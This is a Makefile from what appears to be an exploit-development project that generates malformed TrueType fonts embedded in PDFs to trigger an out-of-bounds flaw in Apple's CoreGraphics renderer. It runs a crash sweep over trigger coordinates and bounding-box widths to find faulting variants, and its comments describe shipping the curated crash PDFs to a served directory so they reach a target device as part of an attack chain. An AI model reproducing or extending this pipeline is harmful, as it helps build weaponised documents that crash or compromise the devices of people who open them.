PYTHON ?= /opt/homebrew/bin/python3

DX_VALUES = 33 34 35 36 37 38 39 40
DX_PDFS = $(patsubst %,trigger_dx%.pdf,$(DX_VALUES))
DX_TTFS = $(patsubst %,trigger_dx%.ttf,$(DX_VALUES))

# Phase A crash sweep (PLAN/GLYPHGRIFT_CRASH_CONVERSION_PLAN.md): push the OOB
# offset by raising the trigger x (TRIG_X) toward int16 max and shrinking the
# broken-bbox width (DX). The goal is a variant that FAULTS the local renderer
# (exit 138/139) rather than just rendering — the crash class that reproduces on
# the device as a renderer crash (→ crash report → verifiable OOB proof).
CRASH_TRIGX = 32000 32500 32760 32767
CRASH_DX    = 1 8 33 40

# Crash-variant names shipped into the served dir (curated from the sweep).
CRASH_PDFS = \
  crash_tx32767_dx40.pdf crash_tx32767_dx33.pdf crash_tx32767_dx8.pdf crash_tx32767_dx1.pdf \
  crash_tx32760_dx40.pdf crash_tx32760_dx33.pdf \
  crash_tx32500_dx40.pdf

.PHONY: all clean render verify crash-sweep

all: trigger.pdf trigger_stack.pdf trigger_k128.pdf trigger_k192.pdf $(DX_PDFS) $(CRASH_PDFS)

render: render.c
	clang -O2 -g -o $@ $< -framework ImageIO -framework CoreGraphics -framework CoreFoundation

# Gate 0 (PLAN/GLYPHGRIFT_CHAIN_FIX_PLAN.md): prove the PDFs reach aa_cache_render.
# On an unpatched host these crash (SIGSEGV); "survived" means the local CG is patched.
verify: render
	@echo "=== Gate 0: local render harness (control + bundled) ==="
	./render trigger.pdf ; echo "trigger.pdf exit=$$?"
	./render trigger_k128.pdf ; echo "trigger_k128.pdf exit=$$?"

# Gate 2: offline crash sweep. Generate TRIG_X × DX candidates into crash/, render
# each, and report the exit class. 138/139 = faults (ship these as crash_c*.pdf).
crash-sweep: render
	@echo "=== Phase A: crash sweep (TRIG_X x DX) ==="
	@mkdir -p crash
	@idx=0; \
	for tx in $(CRASH_TRIGX); do \
	  for dx in $(CRASH_DX); do \
	    ttf=crash/t_$$tx_d$$dx.ttf; pdf=crash/t_$$tx_d$$dx.pdf; \
	    $(PYTHON) gen_font.py $$ttf $$dx $$tx >/dev/null && \
	    $(PYTHON) gen_pdf.py $$pdf $$ttf >/dev/null && \
	    ./render $$pdf >/dev/null 2>&1; ec=$$?; \
	    printf "TX=%-6s DX=%-3s exit=%s %s\n" $$tx $$dx $$ec $$( [ $$ec -ge 134 ] && echo "FAULT" || echo "" ); \
	    if [ $$ec -ge 134 ]; then cp $$pdf crash/crash_c$$idx.pdf; idx=$$((idx+1)); fi; \
	  done; \
	done; \
	echo "faulting candidates: $$idx (crash/crash_c*.pdf)"

trigger.ttf: gen_font.py
	$(PYTHON) gen_font.py $@ 33

trigger_stack.ttf: gen_font.py
	$(PYTHON) gen_font.py $@ 31

trigger_k128.ttf: gen_font.py
	$(PYTHON) gen_font.py $@ 34

trigger_k192.ttf: gen_font.py
	$(PYTHON) gen_font.py $@ 36

trigger_dx%.ttf: gen_font.py
	$(PYTHON) gen_font.py $@ $*

trigger.pdf: gen_pdf.py trigger.ttf
	$(PYTHON) gen_pdf.py $@ trigger.ttf

trigger_stack.pdf: gen_pdf.py trigger_stack.ttf
	$(PYTHON) gen_pdf.py $@ trigger_stack.ttf

trigger_k128.pdf: gen_pdf.py trigger_k128.ttf
	$(PYTHON) gen_pdf.py $@ trigger_k128.ttf

trigger_k192.pdf: gen_pdf.py trigger_k192.ttf
	$(PYTHON) gen_pdf.py $@ trigger_k192.ttf

trigger_dx%.pdf: gen_pdf.py trigger_dx%.ttf
	$(PYTHON) gen_pdf.py $@ trigger_dx$*.ttf

# Phase A crash variants: <TX> = trigger contour x, <DX> = broken-bbox width.
# Built from a throwaway ttf so they don't collide with the trigger_* set.
crash_tx32767_dx40.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 40 32767 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32767_dx33.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 33 32767 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32767_dx8.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 8 32767 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32767_dx1.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 1 32767 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32760_dx40.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 40 32760 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32760_dx33.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 33 32760 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf
crash_tx32500_dx40.pdf: gen_font.py gen_pdf.py
	$(PYTHON) gen_font.py _tmp.ttf 40 32500 >/dev/null && $(PYTHON) gen_pdf.py $@ _tmp.ttf >/dev/null && rm -f _tmp.ttf

clean:
	rm -f trigger*.ttf trigger*.pdf _tmp.ttf
	rm -f crash_tx*_dx*.pdf
	rm -rf crash
